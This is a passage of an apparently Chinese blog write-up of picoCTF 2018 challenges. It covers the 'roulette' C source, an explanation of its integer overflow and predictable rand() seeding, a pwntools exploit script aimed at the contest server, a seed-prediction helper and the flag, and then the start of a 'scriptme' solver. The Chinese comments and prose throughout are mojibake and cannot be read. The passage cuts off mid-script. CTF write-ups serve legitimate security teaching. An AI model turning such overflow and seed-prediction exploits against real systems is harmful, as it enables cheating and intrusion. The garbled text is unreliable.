class="comment">//‰ªéstdinËé∑Âèñ‰∏Ä‰∏™ÈïøÊï¥ÂûãÊ≠£Êï∞ÔºåÊúÄÂ§ß‰∏∫LONG_MAXÔºå‰ª•Êç¢Ë°åÁªìÂ∞æ„ÄÇ</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_long</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> l = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!is_digit(c))</span><br><span class="line">      c = getchar();</span><br><span class="line">    <span class="keyword">while</span>(is_digit(c)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(l &gt;= LONG_MAX) &#123;</span><br><span class="line">l = LONG_MAX;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      l *= <span class="number">10</span>;</span><br><span class="line">      l += c - <span class="string">'0'</span>;</span><br><span class="line">      c = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(c != <span class="string">'\n'</span>)</span><br><span class="line">      c = getchar();</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ÈöèÊú∫ËøîÂõû‰∏Ä‰∏™Â∞è‰∫é5000ÁöÑÊ≠£Êï¥Êï∞</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_rand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> seed;</span><br><span class="line">  FILE *f = fopen(<span class="string">"/dev/urandom"</span>, <span class="string">"r"</span>);</span><br><span class="line">  fread(&amp;seed, <span class="keyword">sizeof</span>(seed), <span class="number">1</span>, f);</span><br><span class="line">  fclose(f);</span><br><span class="line">  seed = seed % <span class="number">5000</span>;</span><br><span class="line">  <span class="keyword">if</span> (seed &lt; <span class="number">0</span>) seed = seed * <span class="number">-1</span>;</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">return</span> seed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ÊâìÂç∞ÂΩìÂâçËµÑÈáëÂíåËé∑ËÉúÊ¨°Êï∞Ôºå‰∏ãÊ≥®„ÄÇÔºàËæìÂÖ•ÁÇπ‰∏ÄÔºâ</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_bet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"How much will you wager?"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Current Balance: $%lu \t Current Wins: %lu\n"</span>, cash, wins); </span><br><span class="line">    <span class="keyword">long</span> bet = get_long(); </span><br><span class="line">    <span class="keyword">if</span>(bet &lt;= cash) &#123;</span><br><span class="line">      <span class="keyword">return</span> bet;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You can't bet more than you have!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ÈÄâÊã©‰∏ãÊ≥®ÁõÆÊ†á1~36.ÔºàËæìÂÖ•ÁÇπ‰∫åÔºâ</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_choice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Choose a number (1-%d)\n"</span>, ROULETTE_SIZE);</span><br><span class="line">    <span class="keyword">long</span> choice = get_long();</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> &lt;= choice &amp;&amp; choice &lt;= ROULETTE_SIZE) &#123;</span><br><span class="line">      <span class="keyword">return</span> choice;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Please enter a valid choice."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ÊâìÂç∞flag</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">48</span>];</span><br><span class="line">  FILE *file;</span><br><span class="line">  file = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to open the flag file\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="keyword">sizeof</span>(flag), file);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//‰∏Ä‰∫õËæìËµ¢ÂêéÁöÑÊèêÁ§∫ËØ≠</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *win_msgs[NUM_WIN_MSGS] = &#123;</span><br><span class="line">  <span class="string">"Wow.. Nice One!"</span>,</span><br><span class="line">  <span class="string">"You chose correct!"</span>,</span><br><span class="line">  <span class="string">"Winner!"</span>,</span><br><span class="line">  <span class="string">"Wow, you won!"</span>,</span><br><span class="line">  <span class="string">"Alright, now you're cooking!"</span>,</span><br><span class="line">  <span class="string">"Darn.. Here you go"</span>,</span><br><span class="line">  <span class="string">"Darn, you got it right."</span>,</span><br><span class="line">  <span class="string">"You.. win.. this round..."</span>,</span><br><span class="line">  <span class="string">"Congrats!"</span>,</span><br><span class="line">  <span class="string">"You're not cheating are you?"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *lose_msgs1[NUM_LOSE_MSGS] = &#123;</span><br><span class="line">  <span class="string">"WRONG"</span>,</span><br><span class="line">  <span class="string">"Nice try.."</span>,</span><br><span class="line">  <span class="string">"YOU LOSE"</span>,</span><br><span class="line">  <span class="string">"Not this time.."</span>,</span><br><span class="line">  <span class="string">"Better luck next time..."</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *lose_msgs2[NUM_LOSE_MSGS] = &#123;</span><br><span class="line">  <span class="string">"Just give up!"</span>,</span><br><span class="line">  <span class="string">"It's over for you."</span>,</span><br><span class="line">  <span class="string">"Stop wasting your time."</span>,</span><br><span class="line">  <span class="string">"You're never gonna win"</span>,</span><br><span class="line">  <span class="string">"If you keep it up, maybe you'll get the flag in 100000000000 years"</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//Ê®°ÊãüËΩ¨ÁõòÊïàÊûú</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spin_roulette</span><span class="params">(<span class="keyword">long</span> spin)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Roulette  :  "</span>);</span><br><span class="line">  <span class="keyword">int</span> i, j;</span><br><span class="line">  <span class="keyword">int</span> s = <span class="number">12500</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ROULETTE_SPINS; i++) &#123;</span><br><span class="line">    n = <span class="built_in">printf</span>(<span class="string">"%d"</span>, (i%ROULETTE_SIZE)+<span class="number">1</span>);</span><br><span class="line">    usleep(s);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i = ROULETTE_SPINS; i &lt; (ROULETTE_SPINS+ROULETTE_SIZE); i++) &#123;</span><br><span class="line">    n = <span class="built_in">printf</span>(<span class="string">"%d"</span>, (i%ROULETTE_SIZE)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (((i%ROULETTE_SIZE)+<span class="number">1</span>) == spin) &#123;</span><br><span class="line">      <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    usleep(s);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; ROULETTE_SIZE; k++) &#123;</span><br><span class="line">    n = <span class="built_in">printf</span>(<span class="string">"%d"</span>, ((i+k)%ROULETTE_SIZE)+<span class="number">1</span>);</span><br><span class="line">    s = <span class="number">1.1</span>*s;</span><br><span class="line">    usleep(s);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%ld"</span>, spin);</span><br><span class="line">  usleep(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ÁîüÊàê‰∏Ä‰∏™ÈöèÊú∫Êï∞ÔºåÂ¶ÇÊûúÂíåchoice‰∏ÄÊ†∑ÔºåÂ∞±ÁªôcashÂä†ÂèåÂÄçbet„ÄÇ</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play_roulette</span><span class="params">(<span class="keyword">long</span> choice, <span class="keyword">long</span> bet)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Spinning the Roulette for a chance to win $%lu!\n"</span>, <span class="number">2</span>*bet);</span><br><span class="line">  <span class="keyword">long</span> spin = (rand() % ROULETTE_SIZE)+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  spin_roulette(spin);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (spin == choice) &#123;</span><br><span class="line">    cash += <span class="number">2</span>*bet;</span><br><span class="line">    <span class="built_in">puts</span>(win_msgs[rand()%NUM_WIN_MSGS]);</span><br><span class="line">    wins += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(lose_msgs1[rand()%NUM_LOSE_MSGS]);</span><br><span class="line">    <span class="built_in">puts</span>(lose_msgs2[rand()%NUM_LOSE_MSGS]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Ëé∑Âæó‰∏ÄÁ¨îÈöèÊú∫Êï∞È¢ùÁöÑÂ∞è‰∫é5000ÁöÑÂàùÂßãËµÑÈáëÔºõ‰∏ãÊ≥®Áõ¥Âà∞cashÂ§ß‰∫éONE_BILLION(1000000000)‰∏îwinsÂ§ßÁ≠â‰∫éHOTSTREAK(3)Â∞è‰∫éMAX_WINS(16)Ëé∑Âæóflag„ÄÇ</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  cash = get_rand();</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to ONLINE ROULETTE!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here, have $%ld to start on the house! You'll lose it all anyways &gt;:)\n"</span>, cash);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">long</span> bet;</span><br><span class="line">  <span class="keyword">long</span> choice;</span><br><span class="line">  <span class="keyword">while</span>(cash &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      bet = get_bet();</span><br><span class="line">      cash -= bet;</span><br><span class="line">      choice = get_choice();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">      </span><br><span class="line">      play_roulette(choice, bet);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (wins &gt;= MAX_WINS) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Wow you won %lu times? Looks like its time for you cash you out.\n"</span>, wins);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congrats you made $%lu. See you next time!\n"</span>, cash);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(cash &gt; ONE_BILLION) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*** Current Balance: $%lu ***\n"</span>, cash);</span><br><span class="line"><span class="keyword">if</span> (wins &gt;= HOTSTREAK) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wow, I can't believe you did it.. You deserve this flag!"</span>);</span><br><span class="line">  print_flag();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Wait a second... You're not even on a hotstreak! Get out of here cheater!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Haha, lost all the money I gave you already? See ya later!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊèêÁ§∫ËØ¥Êúâ‰∏§‰∏™bug„ÄÇ</p><p>ÂÖ∂‰∏ÄÂá∫Áé∞Âú®Á¨¨27Ë°åÔºåget_Long()ÂáΩÊï∞ÁöÑ<code>uint64_t l = 0;</code> „ÄÇÂáΩÊï∞Â£∞ÊòéÁöÑËøîÂõûÂÄº‰∏∫<code>long</code> ÂûãÔºåÂÆûÈôÖËøîÂõûÂÄº‰∏∫<code>uint64_t</code> ÂûãÔºåÂâçËÄÖÊúâÁ¨¶Âè∑ÊúÄÂ§ßÂÄº‰∏∫<code>LONG_MAX:2^31-1</code> ÔºåÂêéËÄÖÊó†Á¨¶Âè∑ÊúÄÂ§ßÂÄº‰∏∫<code>ULONG_MAX:2^64-1</code> ÔºåÂ≠òÂú®Âêë‰∏äÊ∫¢Âá∫‰∏∫Ë¥üÊï∞ÁöÑÈ£éÈô©„ÄÇ</p><p>ÁúüÊ≠£‰Ωø‰∏äÊ∫¢Êàê‰∏∫ÂèØËÉΩÁöÑÊòØ32-35Ë°å <code>if(l &gt;= LONG_MAX){l = LONG_MAX;  break;}</code> ÔºåËøô‰∏™Âà§Êñ≠Â∏åÊúõÊéßÂà∂ËøîÂõûÂÄº‰∏çË∂ÖËøá<code>long</code> ÂûãÊï∞ÊçÆÁöÑÊúÄÂ§ßÂÄºÔºå‰ΩÜÂ∫îËØ•ÂÜôÂú®whileÂæ™ÁéØÁªìÊùüÁöÑÂú∞ÊñπËÄå‰∏çÊòØÂºÄÂßãÁöÑÂú∞ÊñπÔºåÂê¶ÂàôÂè™ËÉΩÊéßÂà∂Êï∞ÊçÆËøõÂÖ•Âæ™ÁéØÊó∂Á¨¶ÂêàÊù°‰ª∂ÔºåËÄåÁ¶ªÂºÄÊó∂Â∞±‰∏çÁü•ÈÅì‰∫ÜÔºåÂçÅÂÄç‰ª•ÂÜÖÈÉΩÊòØÂèØËÉΩÁöÑÔºåËÄåËøôË∂≥‰ª•Ê∫¢Âá∫‰∫Ü„ÄÇ</p><p>Âà∞Ê≠§‰∏∫Ê≠¢ÔºåÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂cash‰∏∫‰ªªÊÑèÂÄº‰∫ÜÔºåÂè™Ë¶ÅËæìÂÖ•bet‰∏∫ <code>ÂΩìÂâçcash+2^32-ÁõÆÊ†ácash</code> ÔºåÂú®Â§ßÊ¶ÇÁéá(35/36)ËæìÁöÑÊÉÖÂÜµ‰∏ãÔºåÊàë‰ª¨Â∞±ËÉΩËÆ©cashÂèò‰∏∫ÊÉ≥Ë¶ÅÁöÑÂÄº„ÄÇ</p><p>Ë¶ÅÊãøÂà∞flagËøòË¶ÅÊ±ÇËµ¢Ëá≥Â∞ë‰∏âÊ¨°ÔºåÈÇ£ÈóÆÈ¢ò‰∏çÂ§ßÔºå‰∏ãÂ∞èÊ≥®ÊÄª‰ºöÊúâËµ¢ÁöÑÊó∂ÂÄô„ÄÇÊåâÊ¶ÇÁéáÊù•ÁÆóÔºåÊÄªÊòØÂØπÂõ∫ÂÆöchoice‰∏ãÊ≥®ÔºåÂèØ‰ª•ÊúüÊúõÂú®100Ê¨°Â∑¶Âè≥Ëµ¢‰∏âÊ¨°„ÄÇ‰ΩÜÈ¢òÁõÆÂÅö‰∫ÜÊéßÂà∂ÔºåÂ§™È¢ëÁπÅ‰∫§‰∫í‰ºöË¢´Á¶ÅÊ≠¢ËøûÊé•„ÄÇ‰∫éÊòØÁúãÁúãÂÖ∂‰ªñÁöÑÊñπÊ≥ï„ÄÇ</p><p>Â¶ÇÊûúË¶ÅÊîπÂèòwinsÔºåÂè™ËÉΩ‰Ωøchoice‰∏é166Ë°åÁöÑ <code>long spin = (rand() % ROULETTE_SIZE)+1;</code> Áõ∏Á≠âÔºåÈÇ£‰πà‰ºöÂèëÁé∞Ëøô‰∏™ÈöèÊú∫Êï∞Â∫èÂàóÊòØÂú®Á¨¨52Ë°åÊí≠ÁßçÁöÑÔºåÁßçÂ≠êÂ∞±ÊòØÊàë‰ª¨ÁöÑÂàùÂßãËµÑÈáëÔºåÊòØÂ∑≤Áü•ÁöÑ„ÄÇ‰∫éÊòØÂ∞±ÂèØ‰ª•Áü•ÈÅìÊØè‰∏ÄÊ¨°ÁöÑspin‰∫Ü„ÄÇEXPÊê¨ËøêËá™ <a href="https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md" target="_blank" rel="noopener">https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md</a> ÔºåÂÅ∑‰∏™ÊáíÂ∞±‰∏çÂÜô‰∫Ü„ÄÇ</p><p><code>picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_e9328e04}</code> </p><p><img src="1541294444617.png" alt="1541294444617"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#get_rand_seq.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> seed = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    srand(seed);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d,"</span>, rand());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'2018shell1.picoctf.com'</span>, <span class="number">21444</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">lines = r.recvuntil(<span class="string">'&gt; '</span>).split(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(lines)</span><br><span class="line"></span><br><span class="line">balance = int(lines[<span class="number">1</span>].split()[<span class="number">2</span>][<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Start balance: &#123;&#125;"</span>.format(balance))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Predicting random values"</span>)</span><br><span class="line">values = subprocess.check_output([<span class="string">"./get_rand_seq"</span>, str(balance)])</span><br><span class="line">values = values.split(<span class="string">','</span>)</span><br><span class="line">values = [int(v, <span class="number">10</span>) <span class="keyword">for</span> v <span class="keyword">in</span> values[:<span class="number">-1</span>]]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">ROULETTE_SIZE = <span class="number">36</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">   spin = (values[i] % ROULETTE_SIZE) + <span class="number">1</span></span><br><span class="line">   i += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">   log.info(<span class="string">"Putting &#123;&#125;$ on &#123;&#125;"</span>.format(balance, spin))</span><br><span class="line"></span><br><span class="line">   r.sendline(<span class="string">"&#123;&#125;"</span>.format(balance))</span><br><span class="line">   r.sendline(<span class="string">"&#123;&#125;"</span>.format(spin))</span><br><span class="line"></span><br><span class="line">   balance *= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">print</span> r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">print</span> r.recv()</span><br><span class="line"></span><br><span class="line">spin = (values[i] % ROULETTE_SIZE) + <span class="number">1</span></span><br><span class="line">i += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Putting &#123;&#125;$ on &#123;&#125;"</span>.format(<span class="number">11474836400</span>, spin))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"&#123;&#125;"</span>.format(<span class="number">11474836400</span>)) <span class="comment"># Put some negative numbers, bug in get_long</span></span><br><span class="line">r.sendline(<span class="string">"&#123;&#125;"</span>.format((spin + <span class="number">1</span>) % <span class="number">36</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'You deserve this flag!'</span>)</span><br><span class="line"><span class="keyword">print</span> r.recvall()</span><br><span class="line"></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><h2 id="scriptme"><a href="#scriptme" class="headerlink" title="scriptme"></a>scriptme</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/bintest<span class="comment"># nc 2018shell2.picoctf.com 61344</span></span><br><span class="line">Rules:</span><br><span class="line">() + () = ()()                                      =&gt; [combine]</span><br><span class="line">((())) + () = ((())())                              =&gt; [absorb-right]</span><br><span class="line">() + ((())) = (()(()))                              =&gt; [absorb-left]</span><br><span class="line">(())(()) + () = (())(()())                          =&gt; [combined-absorb-right]</span><br><span class="line">() + (())(()) = (()())(())                          =&gt; [combined-absorb-left]</span><br><span class="line">(())(()) + ((())) = ((())(())(()))                  =&gt; [absorb-combined-right]</span><br><span class="line">((())) + (())(()) = ((())(())(()))                  =&gt; [absorb-combined-left]</span><br><span class="line">() + (()) + ((())) = (()()) + ((())) = ((()())(())) =&gt; [left-associative]</span><br><span class="line"></span><br><span class="line">Example: </span><br><span class="line">(()) + () = () + (()) = (()())</span><br><span class="line"></span><br><span class="line">Let<span class="string">'s start with a warmup.</span></span><br><span class="line"><span class="string">(()()()) + (()) = ???</span></span><br></pre></td></tr></table></figure><p>solve.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">depth</span><span class="params">(s)</span>:</span></span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(len(s)!=<span class="number">0</span>):</span><br><span class="line">        s=s.replace(<span class="string">'()'</span>,<span class="string">''</span>)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(s1,s2)</span>:</span></span><br><span class="line">    d1=depth(s1)</span><br><span class="line">    d2=depth(s2)</span><br><span class="line">    <span class="keyword">if</span> d1==d2:</span><br><span class="line">        <span class="keyword">return</span> s1+s2</span><br><span class="line">    <span class="keyword">if</span> d1&lt;d2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s%s)"</span>%(s1,s2[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">if</span> d1&gt;d2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s%s)"</span>%(s1[<span class="number">1</span>:<span class="number">-1</span>],s2)</span><br><span class="line">solve = <span class="keyword">lambda</span> x:reduce(calc,x.replace(<span class="string">" "</span>,<span class="string">''</span>).split(<span class="string">'+'</span>))</span><br><span class="line"></span><br><span class="line">host = <span class="string">'2018shell2.picoctf.com'</span></span><br><span class="line">port = <span class="number">61344</span></span><br><span class="line">r=remote(host,port)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">lines=r.recvuntil(<span class="string">'\n&gt;'</span>).split(<span 